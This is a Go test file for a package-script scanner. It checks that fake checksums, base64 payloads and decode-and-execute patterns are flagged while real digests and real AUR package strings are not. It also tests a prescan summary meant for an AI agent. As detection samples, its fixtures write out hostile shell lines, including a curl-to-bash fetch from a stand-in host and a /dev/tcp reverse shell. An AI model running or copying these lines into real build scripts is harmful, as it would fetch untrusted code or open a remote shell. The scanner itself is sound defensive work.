package scanner

import (
	"strings"
	"testing"
)

// realSha256 is an actual digest (sha256 of the empty string) — high entropy.
const realSha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

func hasKind(r *Report, k Kind) bool {
	for _, f := range r.Findings {
		if f.Kind == k {
			return true
		}
	}
	return false
}

func TestCleanPackageIsSilent(t *testing.T) {
	pkg := `pkgname=hello
source=("https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz")
sha256sums=('` + realSha256 + `')

build() {
  cd "$srcdir/hello-2.12"
  ./configure --prefix=/usr
  make
}`
	r := Scan(pkg)
	if !r.Clean() {
		t.Fatalf("clean package flagged: %+v", r.Findings)
	}
	if r.Checksums != 1 {
		t.Errorf("Checksums = %d, want 1", r.Checksums)
	}
}

func TestRealChecksumNotFlagged(t *testing.T) {
	// A genuine high-entropy digest in a sums array must never be surfaced.
	pkg := "sha256sums=('" + realSha256 + "')\nsource=('x.tar.gz')"
	r := Scan(pkg)
	if hasKind(r, KindLowEntropyChecksum) {
		t.Error("genuine sha256 flagged as low-entropy checksum")
	}
	if hasKind(r, KindUnexplainedEntropy) {
		t.Error("genuine sha256 flagged as unexplained entropy")
	}
}

func TestLowEntropyChecksumFlagged(t *testing.T) {
	// 64 hex chars but almost no entropy — not a real digest.
	fake := strings.Repeat("ab", 32) // len 64, entropy ~1.0
	pkg := "sha256sums=('" + fake + "')\nsource=('x.tar.gz')"
	r := Scan(pkg)
	if !hasKind(r, KindLowEntropyChecksum) {
		t.Fatalf("low-entropy checksum not flagged: %+v", r.Findings)
	}
}

func TestEncodedPayloadFlagged(t *testing.T) {
	// A base64 blob sitting in the build body — a possible encoded payload.
	payload := "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weTEyMzQ1Njc4OTBhYmNkZWY"
	pkg := `source=('x.tar.gz')
sha256sums=('` + realSha256 + `')
build() {
  echo "` + payload + `" | base64 -d | sh
}`
	r := Scan(pkg)
	if !hasKind(r, KindUnexplainedEntropy) {
		t.Fatalf("encoded payload not flagged: %+v", r.Findings)
	}
	// And the real checksum in the same file must remain silent.
	if hasKind(r, KindLowEntropyChecksum) {
		t.Error("real checksum wrongly flagged alongside payload")
	}
}

func TestExcessCountFlagged(t *testing.T) {
	// Two high-entropy blobs, one source — a possible decryptor+payload pair.
	a := "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weUFBQUJCQ0ND"
	b := "RGVjcnlwdG9yS2V5V2l0aExvdHNPZkVudHJvcHlYWVpaWlpaWlla"
	pkg := `source=('x.tar.gz')
_a="` + a + `"
_b="` + b + `"`
	r := Scan(pkg)
	if r.HighEntropyBlobs < 2 {
		t.Fatalf("expected >=2 high-entropy blobs, got %d: %+v", r.HighEntropyBlobs, r.Findings)
	}
	if !hasKind(r, KindExcessEntropyCount) {
		t.Fatalf("excess count not flagged: %+v", r.Findings)
	}
}

func TestCompressibleStringNotFlagged(t *testing.T) {
	// High character entropy (32 distinct symbols) but a repeated block — Shannon
	// entropy alone would flag it; compressibility correctly suppresses it.
	block := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"
	structured := strings.Repeat(block, 4) // len 128, entropy ~5.0, highly compressible
	if e := shannon(structured); e < encodedEntropy {
		t.Fatalf("test string entropy %.2f below threshold; not a valid case", e)
	}
	pkg := `source=('x.tar.gz')
_x="` + structured + `"`
	r := Scan(pkg)
	if hasKind(r, KindUnexplainedEntropy) {
		t.Errorf("structured (compressible) string wrongly flagged: %+v", r.Findings)
	}
}

func TestBlobInCommentIgnored(t *testing.T) {
	payload := "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weTEyMzQ1Njc4OTBYWVo"
	pkg := "source=('x.tar.gz')\n# example only: _p=\"" + payload + "\""
	r := Scan(pkg)
	if hasKind(r, KindUnexplainedEntropy) {
		t.Errorf("payload inside a comment should be ignored: %+v", r.Findings)
	}
}

func TestZoneReportsFunction(t *testing.T) {
	payload := "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weTEyMzQ1Njc4OTBYWVo"
	pkg := "source=('x.tar.gz')\npackage() {\n  _p=\"" + payload + "\"\n}"
	r := Scan(pkg)
	var got string
	for _, f := range r.Findings {
		if f.Kind == KindUnexplainedEntropy {
			got = f.Zone
		}
	}
	if got != "package()" {
		t.Errorf("zone = %q, want package()", got)
	}
}

func TestDecodeExecShapeRecognized(t *testing.T) {
	cases := map[string]string{
		"base64 pipe": `build() { echo "$_x" | base64 -d | sh; }`,
		"eval var":    `build() { eval "$_payload"; }`,
		"curl pipe":   `package() { curl https://x.example/i | bash; }`,
		"dev tcp":     `package() { bash -i >& /dev/tcp/1.2.3.4/443 0>&1; }`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			r := Scan(src)
			if !hasKind(r, KindDecodeExecShape) {
				t.Errorf("decode/exec shape not recognized: %+v", r.Findings)
			}
		})
	}
}

func TestConcerningCooccurrence(t *testing.T) {
	blob := "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weTEyMzQ1Njc4OTBYWVo"
	pkg := `source=('x.tar.gz')
package() {
  _p="` + blob + `"
  echo "$_p" | base64 -d | sh
}`
	r := Scan(pkg)
	if !r.Concerning() {
		t.Errorf("expected Concerning() true (opaque blob + decode/exec): %+v", r.Findings)
	}
}

// TestRealWorldStringsNotFlagged pins the false positives found by scanning real
// AUR packages (brave-bin, google-chrome, spotify, visual-studio-code-bin) so a
// future threshold change can't silently reintroduce them.
func TestRealWorldStringsNotFlagged(t *testing.T) {
	benign := []string{
		`package() { cp "$pkgdir/opt/brave-bin/chrome-sandbox" .; }`,
		`package() { install "/opt/google/chrome/WidevineCdm/LICENSE" x; }`,
		`package() { echo "StartupWMClass=Google-chrome" >> x.desktop; }`,
		"pkgname=visual-studio-code-bin",
		"_pkgname=visual-studio-code",
		`prepare() { cp "non-free/binary-amd64/Packages" .; }`,
		`package() { install icons/spotify-linux-512.png x; }`,
	}
	for _, src := range benign {
		r := Scan(src)
		if hasKind(r, KindUnexplainedEntropy) {
			t.Errorf("benign real-world string flagged: %q\n%+v", src, r.Findings)
		}
	}
}

func TestAgentBlockShape(t *testing.T) {
	clean := Scan("sha256sums=('" + realSha256 + "')\nsource=('x.tar.gz')")
	if !strings.Contains(clean.AgentBlock(), "No anomalies") {
		t.Error("clean agent block should say 'No anomalies'")
	}
	dirty := Scan(`build() { echo "TWFsaWNpb3VzUGF5bG9hZFdpdGhIaWdoRW50cm9weTEyMzQ1" | base64 -d | sh; }`)
	block := dirty.AgentBlock()
	if !strings.Contains(block, "<static_prescan>") || !strings.Contains(block, "unexplained_entropy") {
		t.Errorf("dirty agent block missing expected content:\n%s", block)
	}
}
